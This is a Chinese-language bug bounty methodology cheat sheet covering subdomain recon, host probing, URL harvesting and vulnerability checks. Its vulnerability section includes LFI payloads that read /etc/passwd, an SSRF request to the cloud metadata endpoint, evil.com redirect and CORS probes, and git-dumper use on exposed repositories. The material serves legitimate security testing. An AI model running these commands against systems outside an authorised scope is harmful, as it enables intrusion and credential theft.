# 🐛 漏洞赏金方法论

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](./README.it.md) • [🇹🇷 Türkçe Sürüm](./README.tr.md) • [🇬🇷 Ελληνικά](./README.el.md)

```
  ██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
  ██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
  ██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝ 
  ██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝  
  ██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║   
  ╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝   
            完整漏洞赏金挖掘方法论
```

<p align="center">
  <img src="https://img.shields.io/badge/Bug_Bounty-Methodology-red?style=for-the-badge" alt="漏洞赏金">
  <img src="https://img.shields.io/badge/Recon-blue?style=for-the-badge" alt="侦察">
  <img src="https://img.shields.io/badge/Vulnerability-green?style=for-the-badge" alt="漏洞">
</p>

---

## 🗺️ 攻击流程概览

> **阅读说明：** ASN 是自治系统号，OSINT 是开源情报，XSS 是跨站脚本，LFI 是本地文件包含，SSRF 是服务端请求伪造，CORS 是跨源资源共享。下文为独立示例集合，中间文件名并不完全一致，不能直接视为可一键执行的完整脚本；外部来源关联到的域名/IP 也需核验实际归属与项目范围。

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                      漏洞赏金挖掘方法论                                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  阶段1：子域名枚举          阶段2：ASN/IP            阶段3：存活主机       │
│  ├── Subfinder              ├── ASN 映射             ├── HTTPX 探测        │
│  ├── Amass                  ├── IP 收集              ├── 端口发现          │
│  ├── crt.sh                 └── Shodan               └── Aquatone          │
│  └── Wayback                                                                │
│                                                                             │
│  阶段4：URL 收集            阶段5：漏洞挖掘          阶段6：深入分析       │
│  ├── Katana/Hakrawler       ├── XSS 测试             ├── 目录枚举          │
│  ├── GAU                    ├── LFI/RFI              ├── 参数模糊测试      │
│  └── 参数提取               ├── SSRF/CORS            └── Git 暴露          │
│                             └── 开放重定向                                  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 📋 目录

1. [阶段 1：子域名枚举](#-phase-1-subdomain-enumeration)
2. [阶段 2：ASN 与 IP 发现](#-phase-2-asn--ip-discovery)
3. [阶段 3：存活主机发现](#-phase-3-live-host-discovery)
4. [阶段 4：URL 收集](#-phase-4-url-collection)
5. [阶段 5：漏洞挖掘](#-phase-5-vulnerability-hunting)
6. [阶段 6：目录与文件发现](#-phase-6-directory--file-discovery)
7. [快速参考](#-quick-reference)
8. [工具安装](#-tool-installation)

---

<a id="-phase-1-subdomain-enumeration"></a>
## 🔍 阶段 1：子域名枚举

> **目标：** 尽可能发现更多子域名；攻击面越大，通常越有机会发现漏洞。

### 自动化枚举工具

#### Subfinder

> **译注（选项语义）：** `-recursive` 只选择支持递归子域查询的数据源，并不等于自动递归遍历所有发现结果；`-all` 会使用全部数据源，但部分来源仍需配置凭据。参见 [Subfinder 官方说明](https://github.com/projectdiscovery/subfinder#usage)。
```bash
# 利用多个数据源快速发现子域名
subfinder -d example.com -all -recursive -o subfinder.txt

# 选项说明：
# -all: 使用所有数据源（免费及付费）
# -recursive: 递归子域名枚举（原文简述，实际语义见译注）
# -o: 输出文件
```
> 💡 **提示：** Subfinder 快速、可靠。使用 `-all` 以获得更全面的结果。

#### Assetfinder
```bash
# 查找与目标关联的域名及子域名
assetfinder --subs-only example.com > assetfinder.txt

# 快速、简单，适合初步侦察
```
> 💡 **提示：** Assetfinder 速度快，但覆盖范围较有限，可配合其他工具使用。

#### Sublist3r
```bash
# 利用 OSINT 技术枚举子域名
sublist3r -d example.com -e baidu,yahoo,google,bing,ask,netcraft,virustotal,threatcrowd,crtsh,passivedns -v -o sublist3r.txt

# -e: 指定搜索引擎
# -v: 详细输出
```

#### Amass
```bash
# 深入绘制攻击面
amass enum -passive -d example.com | cut -d']' -f 2 | awk '{print $1}' | sort -u > amass.txt

# 被动模式，不直接接触目标
# 使用 -active 获取更多结果（但产生更多活动）
```
> ⚠️ **注意：** Amass 主动模式可能产生较多活动，应先使用被动模式！

### 公共数据源

#### 证书透明度（crt.sh）

> **示例限制：** 原文正则只匹配由 `\w` 构成的三段域名后缀，不是通用的域名解析规则；可能遗漏包含连字符的名称或改变多级子域的结果。证书与归档记录也不代表该主机当前仍可访问。
```bash
# 从 SSL 证书日志中发现子域名
curl -s https://crt.sh\?q\=\example.com\&output\=json | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' > crtsh.txt
```
> 💡 **为什么使用 crt.sh？** 证书透明度日志提供公开记录，可作为免费的子域名情报来源。

#### Wayback Machine
```bash
# 从网页归档中发现历史子域名
curl -s "http://web.archive.org/cdx/search/cdx?url=*.example.com/*&output=text&fl=original&collapse=urlkey" | sort | sed -e 's_https*://__' -e "s/\/.*//" -e 's/:.*//' -e 's/^www\.//' | sort -u > wayback.txt
```
> 💡 **实用提示：** 旧子域名可能仍然存在却已被遗忘，值得进一步检查。

### 子域名结果处理

#### 合并结果并去重
```bash
# 合并所有子域名文件并去重
cat *.txt | sort -u > final_subdomains.txt

# 统计结果数量
wc -l final_subdomains.txt
```

#### 使用 FFUF 暴力枚举子域名
```bash
# 使用字典暴力枚举子域名
ffuf -u "https://FUZZ.example.com" -w wordlist.txt -mc 200,301,302

# -mc: 仅匹配指定状态码
# 建议字典： /usr/share/seclists/Discovery/DNS/subdomains-top1百万-5000.txt
```

#### 使用 Alterx 生成子域名变体
```bash
# 生成子域名变体并进行解析
subfinder -d example.com | alterx | dnsx

# 使用常见模式扩展域名候选
echo example.com | alterx -enrich | dnsx

# 使用字典生成变体
echo example.com | alterx -pp word=/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | dnsx
```
> 💡 **示例：** 如果发现 `dev.example.com`，alterx 会生成 `dev1`、`dev2`、`dev-api` 等。

---

<a id="-phase-2-asn--ip-discovery"></a>
## 🌐 阶段 2：ASN 与 IP 发现

> **目标：** 查找与目标组织相关的 IP 范围及基础设施。

### ASN 映射

```bash
# 发现与域名所属 ASN 相关的 IP 地址
asnmap -d example.com | dnsx -silent -resp-only

# 按组织名称发现资产
amass intel -org "organization_name"

# 发现指定 IP 范围内的资产
amass intel -active -cidr 159.69.129.82/32

# 按 ASN 编号发现资产
amass intel -active -asn [asnno]
```
> 💡 **为什么关注 ASN？** 组织可能使用整段 IP 地址，可据此寻找未显露的服务器。

### IP 收集

#### VirusTotal
```bash
# 从 VirusTotal 提取 IP 地址
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=example.com&apikey=[api-key]" | jq -r '.. | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
```

#### AlienVault OTX
```bash
# 从 AlienVault Open Threat Exchange 获取 IP 地址
curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/example.com/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
```

#### URLScan.io
```bash
# 从 URLScan.io 提取 IP 地址
curl -s "https://urlscan.io/api/v1/search/?q=domain:example.com&size=10000" | jq -r '.results[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
```

#### Shodan SSL 搜索
```bash
# 使用 Shodan SSL 证书搜索发现 IP 地址
shodan search Ssl.cert.subject.CN:"example.com" 200 --fields ip_str | httpx -sc -title -server -td
```
> 💡 **实用提示：** Shodan SSL 搜索可发现使用目标 SSL 证书的服务器，包括未直接显露的服务器。

---

<a id="-phase-3-live-host-discovery"></a>
## ✅ 阶段 3：存活主机发现

> **目标：** 筛选子域名，仅保留存活且可访问的主机。

### 使用 HTTPX 进行 HTTP 探测

```bash
# 在多个端口上进行基本探测
cat subdomain.txt | httpx -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt

# 详细探测状态码、页面标题及技术栈
cat subdomain.txt | httpx -sc -title -server -td -ports 80,443,8080,8000,8888 -threads 200

# 选项：
# -sc: 状态码
# -title: 页面标题
# -server: Server 响应头
# -td: 技术栈识别
```

### 使用 Aquatone 进行可视化侦察

```bash
# 对存活主机截图
cat hosts.txt | aquatone

# 自定义端口
cat hosts.txt | aquatone -ports 80,443,8000,8080,8443

# 扩展端口范围（更全面）
cat hosts.txt | aquatone -ports 80,81,443,591,2082,2087,2095,2096,3000,8000,8001,8008,8080,8083,8443,8834,8888
```
> 💡 **为什么截图？** 快速识别值得关注的应用、登录面板及错误页面。

---

<a id="-phase-4-url-collection"></a>
## 🔗 阶段 4：URL 收集

> **目标：** 尽可能收集更多 URL，用于参数与漏洞测试。

### 主动爬取

#### Katana
```bash
# 用于 URL 发现的快速网页爬虫
katana -u livesubdomains.txt -d 2 -o urls.txt

# -d 2: 深度为 2 层
# 适用于现代 Web 应用，速度快且高效
```

#### Hakrawler
```bash
# 简单、快速的网页爬虫
cat urls.txt | hakrawler -u > crawled_urls.txt
```

### 被动 URL 收集

#### GAU（Get All URLs，收集已知 URL）
```bash
# 从 AlienVault OTX、Wayback Machine 和 Common Crawl 收集已知 URL
cat livesubdomains.txt | gau | sort -u > passive_urls.txt

# 获取状态码为 200 的 URL 并去重
echo example.com | gau --mc 200 | urldedupe > urls.txt
```
> 💡 **为什么使用 GAU？** 从历史数据中发现 URL，可能找到隐藏端点。

#### URLFinder
```bash
# 从多个数据源发现 URL
urlfinder -d example.com | sort -u > urlfinder_urls.txt
```

### 参数提取

```bash
# 提取包含参数的 URL，作为重点测试候选
cat allurls.txt | grep '=' | urldedupe | tee params_urls.txt

# 参数模式匹配
cat allurls.txt | grep -E '\?[^=]+=.+$' | tee params_urls.txt

# GF SQLi 模式：筛选可能值得进行 SQL 注入测试的 URL
cat allurls.txt | gf sqli

# GF XSS 模式
cat allurls.txt | gf xss

# GF LFI 模式
cat allurls.txt | gf lfi
```
> 💡 **GF 模式：** 安装 `gf` 并从 github.com/1ndianl33t/Gf-Patterns 下载模式定义

---

<a id="-phase-5-vulnerability-hunting"></a>
## 🔓 阶段 5：漏洞挖掘

### 🔴 XSS 发现

#### 反射型 XSS 测试

> **译注：** 下方流水线主要发现并筛选含参数的 URL，没有插入 XSS 测试载荷，也没有验证浏览器中的脚本执行。GF、正则及状态码匹配提供候选项，不能单独作为已确认漏洞的证据；LFI、重定向和接管检查也需人工核实。
```bash
# 反射型 XSS 测试流水线（此处主要收集候选 URL，见译注）
subfinder -d "example.com" -all -recursive | \
httpx -mc 200 -silent | \
sed -E 's,https?://(www\.)?,,' | anew | \
urlfinder -all | \
iconv -f ISO-8859-1 -t UTF-8 -c | \
grep -aE '\?.*=.*(&.*)?' | \
grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|jpeg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | \
awk -F'[?&=]' '!seen[$1$2]++' | anew
```

#### 盲 XSS 测试
```bash
# 使用专门载荷测试盲 XSS
# 使用 XSS Hunter 或 Burp Collaborator 等服务
# 在输入字段、请求头及参数中插入载荷
```
> 💡 **盲 XSS：** 载荷可能在管理员稍后查看数据时执行，可通过回连服务观察。

### 🔴 LFI 发现

```bash
# 使用 FFUF 进行 LFI 测试，并检测 passwd 文件特征
echo "https://example.com/" | gau | gf lfi | uro | \
sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | \
xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v

# 使用 curl 与并行处理进行 LFI 测试
gau example.com | gf lfi | qsreplace "/etc/passwd" | \
xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

# HTTPx LFI 测试
echo 'https://example.com/index.php?page=' | \
httpx -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\*|\$[^\:]*):0:0:"
```
> 💡 **LFI 提示：** 尝试 `/etc/passwd`、`....//....//etc/passwd` 及其编码变体！

### 🔴 开放重定向发现

```bash
# 查找重定向参数
cat urls.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|next=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_url=|rurl=|target=|to=|url=" | tee redirect_params.txt

# GF 重定向模式
cat urls.txt | gf redirect | uro | sort -u | tee redirect_params.txt

# 测试重定向参数
cat redirect_params.txt | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"

# 完整开放重定向流水线
subfinder -d example.com -all | httpx -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"
```

### 🔴 SSRF 发现

```bash
# 查找可能涉及 SSRF 的参数
cat urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u

# 查找 API/Webhook 模式
cat urls.txt | grep -i 'webhook\|callback\|upload\|fetch\|import\|api' | sort -u

# Nuclei SSRF 扫描
cat urls.txt | nuclei -t nuclei-templates/vulnerabilities/ssrf/

# 针对 localhost 的基本 SSRF 测试
curl "https://example.com/page?url=http://127.0.0.1:80/"

# 云元数据 SSRF（AWS）
curl "https://example.com/api?endpoint=http://169.254.169.254/latest/meta-data/"
```
> ⚠️ **SSRF 影响：** 可能访问内部服务、云元数据等。

### 🔴 CORS 测试

> **更正：** 原文将 `Access-Control-Allow-Origin: *` 与凭据同时出现直接定为 Critical，这是错误的。凭据模式为 `include` 时，浏览器不接受通配符来源；还需证明实际跨源数据访问及影响。仅用 `curl -I` 查看响应头不足以得出该结论。参见 [WHATWG Fetch 规范](https://fetch.spec.whatwg.org/#cors-protocol-and-credentials)。

```bash
# 使用自定义 Origin 测试 CORS 配置
curl -H "Origin: http://evil.com" -I https://example.com/api/

# 详细 CORS 分析
curl -H "Origin: http://evil.com" -I https://example.com/api/ | \
grep -i -e "access-control-allow-origin" -e "access-control-allow-methods" -e "access-control-allow-credentials"

# 使用 Nuclei 自动扫描 CORS 配置
cat subdomains.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt
```
> 💡 **CORS 漏洞：** 如果 `Access-Control-Allow-Origin: *` 携带凭据即为严重漏洞！（原文断言不准确，见译注）

### Nuclei 漏洞扫描

> **版本说明：** 原文的 `nuclei-templates/vulnerabilities/...` 路径与模块可用性依赖模板版本，现行官方库按协议等目录组织。不能假定旧路径在本地存在；命令保留原样，参见 [官方 HTTP 模板目录](https://github.com/projectdiscovery/nuclei-templates/tree/main/http)。

```bash
# 单个目标
nuclei -u https://example.com -bs 50 -c 30

# 多个目标
nuclei -l live_domains.txt -bs 50 -c 30

# 仅严重与高危级别
nuclei -l live_domains.txt -s critical,high -bs 50 -c 30

# -bs: 批量大小
# -c: 并发数
```

---

<a id="-phase-6-directory--file-discovery"></a>
## 📂 阶段 6：目录与文件发现

### 敏感文件发现

```bash
# 基本敏感文件扩展名
cat allurls.txt | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"

# 扩展的敏感文件正则表达式
cat allurls.txt | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"

# 用于文件发现的 Google 搜索语法
# site:*.example.com (ext:doc OR ext:docx OR ext:pdf OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:sql OR ext:bak OR ext:conf OR ext:log)
```

### 目录暴力枚举

#### Dirsearch
```bash
# 基本目录发现
dirsearch -u https://example.com --full-url --deep-recursive -r

# 扩展为多个文件扩展名
dirsearch -u https://example.com -e php,cgi,htm,html,js,txt,bak,zip,old,conf,log,asp,aspx,jsp,sql,json,xml,yml,yaml,py,rb --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects
```

#### 使用 FFUF 发现目录
```bash
# 综合 FFUF 目录暴力枚举
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
-u https://example.com/FUZZ \
-fc 400,401,402,403,404,429,500,501,502,503 \
-recursion -recursion-depth 2 \
-e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env \
-ac -c \
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" \
-t 10
```

### Git 暴露检测

```bash
# 检测暴露的 .git 目录
cat domains.txt | httpx -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe

# 检查 .git/config
curl -s https://example.com/.git/config

# 若仓库暴露则导出 Git 仓库
git-dumper https://example.com/.git/ output/
```
> ⚠️ **Git 暴露：** 可能泄露源代码、凭据及敏感信息！

### 使用 Arjun 发现隐藏参数

```bash
# 被动参数发现
arjun -u https://example.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"

# 使用字典主动发现参数
arjun -u https://example.com/endpoint.php -oT arjun_output.txt -m GET,POST \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-t 10 --rate-limit 10 --headers "User-Agent: Mozilla/5.0"
```

### 子域名接管（Subdomain Takeover）

```bash
# 自动化子域名接管检测
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
```
> 💡 **接管迹象：** CNAME 指向尚未认领的服务（如 S3、Heroku 等）

### WordPress 测试

```bash
# 完整 WordPress 安全扫描
wpscan --url https://example.com --disable-tls-checks --api-token YOUR_API_TOKEN \
-e at -e ap -e u --enumerate ap --plugins-detection aggressive --force

# -e at: 所有主题
# -e ap: 所有插件
# -e u: 用户
```

---

<a id="-quick-reference"></a>
## 📊 快速参考

### 侦察流水线

```bash
# 1. 子域名枚举
subfinder -d example.com -all -recursive -o subs.txt
amass enum -passive -d example.com >> subs.txt
cat subs.txt | sort -u > all_subs.txt

# 2. 存活主机发现
cat all_subs.txt | httpx -ports 80,443,8080,8000 -threads 200 > alive.txt

# 3. URL 收集
cat alive.txt | gau | sort -u > urls.txt
cat alive.txt | katana -d 2 >> urls.txt

# 4. 带参数的 URL
cat urls.txt | grep '=' | urldedupe > params.txt

# 5. 漏洞扫描
nuclei -l alive.txt -s critical,high -o nuclei_results.txt
```

### 常用单行命令

| 用途 | 命令 |
|---------|---------|
| 发现子域名 | `subfinder -d target.com -silent` |
| 检查存活主机 | `cat subs.txt \| httpx -silent` |
| 获取所有 URL | `echo target.com \| gau` |
| 查找参数 | `cat urls.txt \| grep '='` |
| 测试重定向 | `cat urls.txt \| gf redirect` |
| Nuclei 扫描 | `nuclei -l hosts.txt -s critical,high` |

### 值得关注的文件扩展名

| 类型 | 扩展名 |
|------|------------|
| **配置** | `.env, .config, .conf, .ini, .yml, .yaml` |
| **备份** | `.bak, .old, .backup, .zip, .tar.gz` |
| **源代码** | `.php, .asp, .aspx, .jsp, .py, .rb` |
| **数据** | `.sql, .db, .sqlite, .json, .xml` |
| **文档** | `.pdf, .doc, .docx, .xls, .xlsx` |

---

<a id="-tool-installation"></a>
## 🛠️ 工具安装

### 必备工具

```bash
# Subfinder
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# HTTPX
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest

# Nuclei
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Katana
go install github.com/projectdiscovery/katana/cmd/katana@latest

# GAU
go install github.com/lc/gau/v2/cmd/gau@latest

# FFUF
go install github.com/ffuf/ffuf/v2@latest

# Amass
go install -v github.com/owasp-amass/amass/v4/...@master

# Assetfinder
go install github.com/tomnomnom/assetfinder@latest
```

### XSS 与重定向工具

```bash
# OR（开放重定向测试器）
go install -v github.com/h6nt3r/or@latest

# RC（反射型 XSS）
go install -v github.com/h6nt3r/rc@latest

# CXSS（上下文感知 XSS 扫描器）
go install github.com/haxshadow/cxss@latest

# XSSER
go install -v github.com/h6nt3r/xsser@latest

# GF（Grep 模式）
go install github.com/tomnomnom/gf@latest
```

### 辅助工具

```bash
# URO（URL 去重）
pip3 install uro

# Arjun（参数发现）
pip3 install arjun

# Subzy（接管检测）
go install -v github.com/PentestPad/subzy@latest
```

---

## 🎯 漏洞赏金建议

1. **使用自动化，并进行手动验证** - 工具发现候选项，由您确认漏洞
2. **检查 robots.txt 与 sitemap.xml** - 它们经常揭示未显露的路径
3. **查看 JavaScript 文件** - 关注 API 端点、敏感信息及硬编码凭据
4. **测试所有参数** - 包括隐藏参数（可使用 Arjun）
5. **组合利用漏洞** - SSRF + XSS 可能造成更大影响
6. **报告质量很重要** - 提供清楚的 PoC、影响说明与复现步骤
7. **保持耐心** - 发现有价值的漏洞需要时间

---

## 📚 相关速查表

- [Nuclei](../../Nuclei/README.md)
- [ffuf](../../ffuf/README.md)
- [Subfinder](../../Subfinder/README.md)
- [httpx](../../httpx/README.md)
- [Google 高级搜索](../../Google-Dorking/README.md)
- [Burp Suite](../../Burp-Suite/translations/README.zh-CN.md)

---

<p align="center">
  <b>🐛 祝漏洞挖掘顺利！</b><br>
  <i>漏洞赏金：坚持探索，争取回报</i>
</p>
